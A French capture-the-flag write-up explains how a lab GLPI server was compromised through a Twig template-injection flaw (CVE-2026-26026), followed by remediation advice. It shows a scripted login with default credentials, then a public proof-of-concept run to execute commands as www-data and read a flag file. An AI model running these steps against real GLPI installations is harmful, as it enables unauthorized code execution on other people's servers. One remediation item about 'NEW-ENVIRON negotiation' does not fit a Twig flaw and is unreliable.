---
layout: single
header:
  overlay_image: /assets/images/banner-017.jpg
  overlay_filter: 0.6
toc: true
toc_depth: 6
toc_label: Table of Contents
title: "Challenge Parcinfo : SSTI Twig dans GLPI (CVE-2026-26026) — RCE via double compilation de template"
date: 2026-11-05
categories: [CTF, Exploit]
tags: [ctf, glpi, cve-2026-26026, ssti, twig, rce, shell-exec, www-data, apache, csrf, python, kali, nmap, gobuster, mitre-attck]
---

**Cible :** `176.16.175.245` — HTTP/80 (GLPI)  
**CVE :** CVE-2026-26026  
**Composant :** GLPI 11.0.0 → < 11.0.6  
**Type :** Server-Side Template Injection (SSTI) — Twig  
**Flag :** `flag_4b04625a_5877_4f51_bbf8_9cbb249802d4`

---

## Résultat

Shell `www-data` obtenu via RCE sur `176.16.175.245` (GLPI/Apache). Le fichier `/home/local.txt` était lisible sous cette identité.

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```
flag_4b04625a_5877_4f51_bbf8_9cbb249802d4
```

> L'accès obtenu est une exécution de commande sous le compte du serveur web (`www-data`), **pas un shell root**. Il suffisait néanmoins pour lire `/home/local.txt`.

---

## 1. Découverte des services

```bash
nmap -A 176.16.175.245
```

L'option `-A` active la détection de version, les scripts NSE, l'identification approximative de l'OS et le traceroute.

**Sortie utile :**

```
Nmap scan report for 176.16.175.245
Host is up (0.00023s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.14 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Authentication - GLPI
|_http-server-header: Apache/2.4.52 (Ubuntu)
```

| Port | Service | Rôle |
|---|---|---|
| 22 | SSH / OpenSSH 8.9p1 | Non utilisé dans cette résolution |
| 80 | HTTP / Apache 2.4.52 | Interface GLPI — cible de l'exploitation |

La page identifiée comme *Authentication - GLPI* confirme que l'application du challenge est bien GLPI.

---

## 2. Inspection de l'interface et du formulaire de connexion

```bash
curl -i --max-time 10 http://176.16.175.245/
curl -k -i --max-time 10 https://176.16.175.245/
```

**Première réponse (HTTP/80) :**

```
HTTP/1.1 200 OK
Server: Apache/2.4.52 (Ubuntu)
Content-Type: text/html; charset=UTF-8
<title>Authentication - GLPI</title>
```

Le HTML révèle :
- Formulaire envoyé à `/front/login.php`
- Champs `login_name` et `login_password`
- Source d'authentification locale GLPI
- Jeton CSRF dans un champ caché

> La requête HTTPS a échoué — le port 443 n'était pas ouvert, cohérent avec la sortie Nmap (HTTP/80 uniquement).

---

## 3. État de GLPI et tentative de détection de version

```bash
for p in status.php version.php CHANGELOG.md; do
  echo "===== /$p ====="
  curl -sS --max-time 5 -i "http://176.16.175.245/$p" | head -n 25
done
```

**Réponse de `/status.php` :**

```json
HTTP/1.1 200 OK
Content-Type: application/json
{"glpi":{"status":"OK"},"db":{"status":"OK","main":{"status":"OK"}, ...}
```

**`/version.php` et `/CHANGELOG.md` :** HTTP 404 (page GLPI « Item Not Found »).

> La version précise n'a pas été déterminée par ces requêtes. La confirmation RCE à l'étape 6 constitue une preuve pratique plus forte que la simple détection de bannière.

> **Note :** les messages `curl: (23) Failure writing output to destination` viennent du fait que `head` ferme le tube avant que `curl` ait terminé de transmettre le corps. Ce n'est pas une erreur de l'application.

---

## 4. Connexion à GLPI

Le formulaire requiert un **jeton CSRF frais**. La procédure : récupérer la page → conserver les cookies → extraire le jeton → envoyer le formulaire.

```bash
BASE="http://176.16.175.245"
JAR="/tmp/glpi-cookies.txt"

# Récupération du jeton CSRF
curl -sS -c "$JAR" "$BASE/" -o /tmp/glpi-login.html
TOKEN=$(grep -oP 'name="_glpi_csrf_token"\s+value="\K[^<]+' /tmp/glpi-login.html)

# Envoi du formulaire de connexion
curl -sS -b "$JAR" -c "$JAR" \
  -D /tmp/glpi-headers.txt -o /tmp/glpi-response.html \
  -X POST "$BASE/front/login.php" \
  --data-urlencode "login_name=glpi" \
  --data-urlencode "login_password=glpi" \
  --data-urlencode "auth=local" \
  --data-urlencode "noAUTO=0" \
  --data-urlencode "redirect=" \
  --data-urlencode "_glpi_csrf_token=$TOKEN" \
  --data-urlencode "submit=Sign in"

grep -iE '^(HTTP/|Location:)' /tmp/glpi-headers.txt
```

**Sortie :**

```
HTTP/1.1 302 Found
Location: /front/central.php
```

La redirection vers `/front/central.php` confirme l'authentification réussie.

**Vérification de session :**

```bash
curl -sS -b /tmp/glpi-cookies.txt -c /tmp/glpi-cookies.txt \
  -L -o /tmp/glpi-dashboard.html \
  -w 'HTTP %{http_code} — %{url_effective}\n' \
  http://176.16.175.245/front/central.php

grep -iE '<title>|dashboard|central' /tmp/glpi-dashboard.html | head
```

**Sortie :**

```
HTTP 200 — http://176.16.175.245/front/central.php
<title>Standard Interface - GLPI</title>
```

> ⚠️ Le cookie de session ne doit pas être publié ni transmis à un tiers — il peut permettre de reprendre la session authentifiée.

---

## 5. Mécanisme de CVE-2026-26026

### Nature de la vulnérabilité

CVE-2026-26026 est une injection de modèle côté serveur (**SSTI — Server-Side Template Injection**) dans GLPI. Elle affecte les versions **11.0.0 à < 11.0.6**.

| Champ | Valeur |
|---|---|
| **CVE** | CVE-2026-26026 |
| **Composant** | GLPI 11.0.0 → < 11.0.6 |
| **Type** | SSTI — moteur de template Twig |
| **Prérequis** | Compte avec droit de création de formulaire |
| **Impact** | RCE via `shell_exec` sous `www-data` |
| **Correctif** | GLPI ≥ 11.0.6 |

### Mécanisme de la double compilation Twig

Dans le chemin vulnérable, une valeur liée à l'option d'une **question de formulaire de type liste déroulante** est intégrée dans du contenu Twig rendu une seconde fois. Cette double compilation fait qu'une syntaxe Twig placée dans la valeur est interprétée comme une **expression de template** plutôt que comme du texte ordinaire, permettant d'appeler une fonction PHP (`shell_exec`) via les paramètres de la requête.

### Chaîne d'exploitation

```
Connexion GLPI (compte autorisé à créer des formulaires)
  → création d'un formulaire + question de type liste déroulante
  → insertion de l'expression Twig vulnérable dans l'option
  → requête à l'onglet du formulaire avec paramètres function + commande
  → double rendu Twig → appel de shell_exec
  → sortie de la commande renvoyée dans la réponse HTTP
```

> **CVE-2026-26027 (hors scope)** : une analyse de recherche décrit une chaîne séparée impliquant une XSS stockée non authentifiée (CVE-2026-26027) permettant de créer un compte privilégié quand un administrateur consulte la page des agents. Cette chaîne n'a **pas été exécutée** ici — la connexion `glpi/glpi` disponible a suffi à lancer le PoC authentifié.

---

## 6. Test contrôlé de l'exécution de commande

### 6.1 Installation et lancement du PoC

```bash
git clone https://github.com/petriQore/CVE-2026-26026_PoC.git
cd CVE-2026-26026_PoC
sudo apt install -y python3-requests

python3 POC_GLPI_Form_Dropdown_SSTI.py \
  http://176.16.175.245 \
  -u glpi -p 'glpi' \
  --cmd 'id'
```

**Sortie :**

```
[+] logged in as glpi
[+] created form id=5
[+] dropdown question saved with SSTI payload
[+] RCE CONFIRMED!
[+] Function: shell_exec('id')
=================================================================
  COMMAND OUTPUT
=================================================================
uid=33(www-data) gid=33(www-data) groups=33(www-data)
=================================================================
```

> `uid=33(www-data)` confirme le RCE réel — exécution sous l'identité du serveur web, **pas root**.

### 6.2 Recherche des fichiers de flag

```bash
python3 POC_GLPI_Form_Dropdown_SSTI.py \
  http://176.16.175.245 \
  -u glpi -p 'glpi' \
  --cmd 'id; find / -type f \( -iname "*flag*" -o -iname "local.txt" -o -iname "proof.txt" -o -iname "user.txt" \) 2>/dev/null | head -80'
```

**Sortie déterminante :**

```
[+] logged in as glpi
[+] created form id=6
[+] dropdown question saved with SSTI payload
[+] RCE CONFIRMED!
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/home/local.txt
```

> Les autres résultats (`/proc/sys/kernel/acpi_video_flags`, `/proc/kpageflags`, etc.) sont des fichiers système dont le nom contient `flag` — pas les flags du challenge. La découverte de `/home/local.txt` donne le chemin exact.

---

## 7. Lecture du flag

```bash
python3 POC_GLPI_Form_Dropdown_SSTI.py \
  http://176.16.175.245 \
  -u glpi -p 'glpi' \
  --cmd 'cat /home/local.txt'
```

**Sortie exacte :**

```
[+] logged in as glpi
[+] created form id=7
[+] dropdown question saved with SSTI payload
[+] RCE CONFIRMED!
[+] Function: shell_exec('cat /home/local.txt')
=================================================================
  COMMAND OUTPUT
=================================================================
flag_4b04625a_5877_4f51_bbf8_9cbb249802d4
=================================================================
```

### 🏁 Flag final

```
flag_4b04625a_5877_4f51_bbf8_9cbb249802d4
```

---

## 8. Synthèse de la chaîne causale

| Étape | Action | Résultat |
|---|---|---|
| 1 | `nmap -A` | GLPI identifié sur HTTP/80, SSH sur 22 |
| 2 | Inspection du formulaire | Route `/front/login.php`, jeton CSRF requis, auth locale |
| 3 | Vérification `/status.php` | GLPI et DB opérationnels, version non déterminée par bannière |
| 4 | Connexion `glpi/glpi` | HTTP 302 → `/front/central.php` → session authentifiée |
| 5 | PoC `--cmd 'id'` (form id=5) | RCE confirmé : `uid=33(www-data)` |
| 6 | PoC `find` (form id=6) | `/home/local.txt` découvert |
| 7 | PoC `cat /home/local.txt` (form id=7) | Flag récupéré |

> Les formulaires GLPI créés par le PoC (id=5, 6, 7) peuvent rester dans l'instance du challenge comme traces de test ; aucune suppression n'est rapportée.

---

## 9. Remédiation

- ✅ Mettre à jour GLPI vers la version **≥ 11.0.6**
- ✅ Ne jamais laisser le compte `glpi` avec le mot de passe par défaut `glpi` en production
- ✅ Restreindre le droit de création de formulaire aux seuls comptes nécessaires
- ✅ Désactiver ou filtrer la négociation NEW-ENVIRON lorsque Twig restitue du contenu utilisateur

---

## Références

| # | Source | Lien |
|---|---|---|
| 1 | Avis de sécurité GLPI — GHSA-2c98-648q-h27h | https://github.com/glpi-project/glpi/security/advisories/GHSA-2c98-648q-h27h |
| 2 | Versions GLPI 11.0.6 et 10.0.24 | https://www.glpi-project.org/en/glpi-new-versions-11-0-6-and-10-0-24/ |
| 3 | Analyse technique — chaîne XSS + SSTI (bzhunt.fr) | https://www.bzhunt.fr/blog/cve_glpi/ |
| 4 | PoC authentifié — petriQore/CVE-2026-26026_PoC | https://github.com/petriQore/CVE-2026-26026_PoC |
